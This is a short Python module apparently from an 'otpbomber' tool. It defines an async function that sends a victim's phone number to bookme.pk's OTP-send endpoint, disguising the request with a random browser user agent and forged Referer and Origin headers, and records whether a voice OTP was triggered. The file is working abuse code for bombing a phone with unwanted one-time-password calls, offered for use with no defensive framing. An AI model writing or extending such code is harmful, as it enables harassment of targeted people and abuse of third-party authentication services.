from otpbomber.core import *
from otpbomber.localuseragent import *

async def bookme_voice(phone, client, out):
    name = 'bookme_voice'
    domain = 'bookme.pk'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Referer': 'https://bookme.pk/', 'Origin': 'https://bookme.pk'}
    payload = {'phone_number': f'0{phone[-10:]}'}
    try:
        response = await client.post('https://bookme.pk/api/v1/auth/otp/send', headers=headers, data=payload)
        data = response.json()
        if data.get('status') == 'success' or data.get('success') == True:
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})